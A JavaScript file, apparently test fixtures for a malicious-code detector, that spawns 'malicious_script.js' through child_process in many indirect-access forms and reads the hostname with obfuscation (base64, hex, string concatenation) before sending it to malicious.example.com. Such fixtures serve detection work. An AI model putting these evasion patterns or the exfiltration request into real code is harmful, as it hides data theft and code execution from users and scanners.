

function run_malicious_code() {
    const process = require('child_process');
    // process.spawn('node', ['malicious_script.js']);

    // Pattern 1: Direct property access
    process['spawn']('node', ['malicious_script.js']);
    process['spawn'].call(process, 'node', ['malicious_script.js']);
    process['spawn'].apply({}, ['node', ['malicious_script.js']]);
    process['spawn'].bind({}, 'node', ['malicious_script.js'])();

    // Pattern 2: Reflect.get()
    Reflect.get(process, 'spawn')('node', ['malicious_script.js']);
    Reflect.get(process, 'spawn').call(process, 'node', ['malicious_script.js']);
    Reflect.get(process, 'spawn').apply({}, ['node', ['malicious_script.js']]);
    Reflect.get(process, 'spawn').bind({}, 'node', ['malicious_script.js'])();

    // Pattern 3: Object.getOwnPropertyDescriptor()
    Object.getOwnPropertyDescriptor(process, 'spawn').value('node', ['malicious_script.js']);
    Object.getOwnPropertyDescriptor(process, 'spawn').value.call(process, 'node', ['malicious_script.js']);
    Object.getOwnPropertyDescriptor(process, 'spawn').value.apply({}, ['node', ['malicious_script.js']]);
    Object.getOwnPropertyDescriptor(process, 'spawn').value.bind({}, 'node', ['malicious_script.js'])();
    
    // Pattern 4: Object.getOwnPropertyNames() with find
    process[Object.getOwnPropertyNames(process).find(name => name === 'spawn')]('node', ['malicious_script.js']);
    process[Object.getOwnPropertyNames(process).find(name => name === 'spawn')].call(process, 'node', ['malicious_script.js']);
    process[Object.getOwnPropertyNames(process).find(name => name === 'spawn')].apply({}, ['node', ['malicious_script.js']]);
    process[Object.getOwnPropertyNames(process).find(name => name === 'spawn')].bind({}, 'node', ['malicious_script.js'])();

    // Pattern 5: Object.keys() with find
    process[Object.keys(process).find(name => name === 'spawn')]('node', ['malicious_script.js']);
    process[Object.keys(process).find(name => name === 'spawn')].call(process, 'node', ['malicious_script.js']);
    process[Object.keys(process).find(name => name === 'spawn')].apply({}, ['node', ['malicious_script.js']]);
    process[Object.keys(process).find(name => name === 'spawn')].bind({}, 'node', ['malicious_script.js'])();

    // Pattern 6: Object.entries() with find
    Object.entries(process).find(([name, _]) => name === "spawn")[1]('node', ['malicious_script.js']);
    Object.entries(process).find(([name, _]) => name === "spawn")[1].call(process, 'node', ['malicious_script.js']);
    Object.entries(process).find(([name, _]) => name === "spawn")[1].apply({}, ['node', ['malicious_script.js']]);
    Object.entries(process).find(([name, _]) => name === "spawn")[1].bind({}, 'node', ['malicious_script.js'])();

    // Pattern 7: Object.entries() with filter
    Object.entries(process).filter(([k]) => k === 'spawn')[0][1]('node', ['malicious_script.js']);
    Object.entries(process).filter(([k]) => k === 'spawn')[0][1].call(process, 'node', ['malicious_script.js']);
    Object.entries(process).filter(([k]) => k === 'spawn')[0][1].apply({}, ['node', ['malicious_script.js']]);
    Object.entries(process).filter(([k]) => k === 'spawn')[0][1].bind({}, 'node', ['malicious_script.js'])();
}


function exfiltrate_data() {
    const os = require('os');
    const http = require('http');

    // Pattern 1: Direct property access
    host = os['hostname']();
    host = os['hostname'].call({});
    host = os['hostname'].apply({});
    host = os['hostname'].bind({})();
    // Obfuscated variations:
    // string concatenation
    host = os['host' + 'name']();
    // variable string
    str = "hostname";
    host = os[str]();
    // base64 encoded:
    host = os[Buffer.from('aG9zdG5hbWU=', 'base64').toString('utf-8')]();
    // hex encoded:
    host = os[String.fromCharCode(0x68, 0x6f, 0x73, 0x74, 0x6e, 0x61, 0x6d, 0x65)]();
    host = os[Buffer.from([0x68, 0x6f, 0x73, 0x74, 0x6e, 0x61, 0x6d, 0x65]).toString()]();
    host = os["\x68\x6f\x73\x74\x6e\x61\x6d\x65"]();

    // Pattern 2: Reflect.get()
    host = Reflect.get(os, 'hostname')();
    host = Reflect.get(os, 'hostname').call({});
    host = Reflect.get(os, 'hostname').apply({});
    host = Reflect.get(os, 'hostname').bind({})();

    // Pattern 3: Object.getOwnPropertyDescriptor()
    host = Object.getOwnPropertyDescriptor(os, 'hostname').value();
    host = Object.getOwnPropertyDescriptor(os, 'hostname').value.call({});
    host = Object.getOwnPropertyDescriptor(os, 'hostname').value.apply({});
    host = Object.getOwnPropertyDescriptor(os, 'hostname').value.bind({})();

    // Pattern 4: Object.getOwnPropertyNames() with find
    host = os[Object.getOwnPropertyNames(os).find(name => name === 'hostname')]();
    host = os[Object.getOwnPropertyNames(os).find(name => name === 'hostname')].call({});
    host = os[Object.getOwnPropertyNames(os).find(name => name === 'hostname')].apply({});
    host = os[Object.getOwnPropertyNames(os).find(name => name === 'hostname')].bind({})();

    // Pattern 5: Object.keys() with find
    host = os[Object.keys(os).find(name => name === 'hostname')]();
    host = os[Object.keys(os).find(name => name === 'hostname')].call({});
    host = os[Object.keys(os).find(name => name === 'hostname')].apply({});
    host = os[Object.keys(os).find(name => name === 'hostname')].bind({})();

    // Pattern 6: Object.entries() with find
    host = Object.entries(os).find(([name, _]) => name === "hostname")[1]();
    host = Object.entries(os).find(([name, _]) => name === "hostname")[1].call({});
    host = Object.entries(os).find(([name, _]) => name === "hostname")[1].apply({});
    host = Object.entries(os).find(([name, _]) => name === "hostname")[1].bind({})();

    // Pattern 7: Object.entries() with filter
    host = Object.entries(os).filter(([k]) => k === 'hostname')[0][1]();
    host = Object.entries(os).filter(([k]) => k === 'hostname')[0][1].call({});
    host = Object.entries(os).filter(([k]) => k === 'hostname')[0][1].apply({});
    host = Object.entries(os).filter(([k]) => k === 'hostname')[0][1].bind({})();

    const url = new URL('http://malicious.example.com/exfiltrate');

    const options = {
        hostname: url.hostname,
        port: 80,
        path: url.pathname + `?host=${host}`,
        method: "GET"
    };

    const req = http['request'](options, (res) => {
        res.on("data", () => { }); // ignore response
    });

    req.on("error", () => { });

    req.end();
}